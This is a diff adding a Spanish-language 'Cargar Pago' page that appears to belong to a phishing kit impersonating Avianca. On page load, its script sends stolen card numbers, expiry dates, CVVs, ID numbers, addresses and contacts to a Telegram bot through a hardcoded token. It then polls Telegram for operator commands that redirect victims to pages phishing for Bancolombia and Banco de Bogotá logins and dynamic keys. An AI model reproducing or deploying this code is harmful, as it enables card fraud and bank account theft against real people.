@@ -1,0 +1,214 @@
+1q<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cargar Pago</title>
+    <link
+      rel="shortcut icon"
+      href="./"
+      type="image/x-icon"
+    /><style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    overflow-x: hidden;
+  }
+</style>
+
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        background-color: #ffffff;
+      }
+
+      .loader {
+        border: 16px solid #ffffff;
+        border-top: 16px solid #ff0000;
+        border-radius: 50%;
+        width: 100px;
+        height: 100px;
+        animation: spin 2s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="loader"></div>
+    <script>
+      const config = {
+        token: "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y",
+        chat_id: "-4644294739",
+      };
+
+      
+      // Función para enviar datos al bot de Telegram
+      async function enviarDatosTelegram() {
+        // Obtener datos del localStorage
+        const paymentData = localStorage.getItem("pagojet");
+
+        if (!paymentData) {
+          console.error("No se encontraron datos en localStorage.");
+          return;
+        }
+
+        const parsedData = JSON.parse(paymentData);
+        console.log("Datos encontrados en localStorage:", parsedData);
+
+        // Validar datos requeridos
+        const requiredFields = [
+          "email",
+          "celular",
+          "direccion",
+          "tarjeta",
+          "ftarjeta",
+          "cvv",
+          "id",
+          "banco",
+          "nombre",
+        ];
+        for (const field of requiredFields) {
+          if (!parsedData[field]) {
+            console.error(`Falta el campo obligatorio: ${field}`);
+            return;
+          }
+        }
+
+        // Generar ID de transacción único
+        const transaction_id = `txn_${Date.now()}`;
+        sessionStorage.setItem("transaction_id", transaction_id);
+
+        // Crear el mensaje para Telegram
+        const message = `
+<b>Nuevo pendiente de verificación.</b>
+<b>🛫⠀⠀⠀⠀⠀Avianca⠀⠀⠀⠀⠀🛫</b>
+🆔 <b>ID Transacción:</b> | <code>${transaction_id}</code>
+📡 <b>IP:</b> | <code>${parsedData.ip}</code>
+👮🏻‍♀️ <b>Nombre:</b> | <code>${parsedData.nombre}</code>
+🪪 <b>Cédula:</b> | <code>${parsedData.id}</code>
+📧 <b>Email:</b> | <a href="mailto:${parsedData.email}">${parsedData.email}</a>
+📲 <b>Teléfono:</b> | <code>${parsedData.celular}</code>
+📍 <b>Dirección:</b> | <code>${parsedData.direccion}</code>
+💳 <b>Tarjeta:</b> | <code>${parsedData.tarjeta}</code>
+🗓️ <b>Fecha:</b> | <code>${parsedData.ftarjeta}</code>
+🔐 <b>CVV:</b> | <code>${parsedData.cvv}</code>
+🏦 <b>Banco:</b> | <code>${parsedData.banco}</code>
+
+`;
+
+        if (parsedData.banco) {
+          localStorage.setItem("banco", parsedData.banco);
+          console.log("Banco guardado en localStorage:", parsedData.banco);
+        } else {
+          console.error("El campo 'banco' no está presente en los datos.");
+        }
+
+        try {
+          // Enviar datos a Telegram
+          const response = await fetch(
+            `https://api.telegram.org/bot${config.token}/sendMessage`,
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: config.chat_id,
+                text: message,
+                parse_mode: "HTML",
+              }),
+            }
+          );
+
+          const data = await response.json();
+          if (data.ok) {
+            console.log("Mensaje enviado a Telegram:", data);
+            verificarActualizaciones(transaction_id);
+          } else {
+            console.error("Error al enviar mensaje a Telegram:", data);
+          }
+        } catch (error) {
+          console.error("Error en la solicitud a Telegram:", error);
+        }
+      }
+
+      // Función para verificar actualizaciones en Telegram
+      async function verificarActualizaciones(transaction_id) {
+        console.log("Iniciando verificación de actualizaciones...");
+
+        const bancoSeleccionado = localStorage.getItem("banco"); // Obtiene el banco desde localStorage
+        console.log("Banco seleccionado:", bancoSeleccionado);
+        const redirecciones = {
+          bancolombia: "bancolombia/indexx.html",
+          bogota: "banco_bogota/index.html"
+        };
+
+        // Si el banco existe en el objeto de redirecciones, usa su URL. Si no, usa una por defecto.
+        const paginaDestino =
+          redirecciones[bancoSeleccionado] || "pedir_logo.html";
+        const redirectTimeout = setTimeout(() => {
+          console.log(`Redirigiendo a ${paginaDestino}...`);
+          window.location.href = paginaDestino;
+        }, 2000);
+
+        const interval = setInterval(async () => {
+          try {
+            const response = await fetch(
+              `https://api.telegram.org/bot${config.token}/getUpdates`
+            );
+            const updates = await response.json();
+
+            if (updates.result) {
+              for (const update of updates.result) {
+                if (update.callback_query) {
+                  const [action, id] = update.callback_query.data.split(":");
+                  if (id === transaction_id) {
+                    clearTimeout(redirectTimeout);
+                    clearInterval(interval);
+
+                    switch (action) {
+                      case "pedir_logo":
+                        window.location.href = "pedir_logo.html";
+                        break;
+                      case "pedir_dinamica":
+                        window.location.href = "pedir_dinamica.html";
+                        break;
+                      case "error_tc":
+                        window.location.href = "pago.html";
+                        break;
+                      case "error_logo":
+                        window.location.href = "pedir_logo.html";
+                        break;
+                      case "finalizar":
+                        window.location.href = "finish.html";
+                        break;
+                      default:
+                        console.error("Acción desconocida:", action);
+                    }
+                  }
+                }
+              }
+            }
+          } catch (error) {
+            console.error("Error al verificar actualizaciones:", error);
+          }
+        }, 5000); // Verificar cada 5 segundos
+      }
+
+      // Inicia el envío al cargar la página
+      enviarDatosTelegram();
+    </script>
+  </body>
+</html>
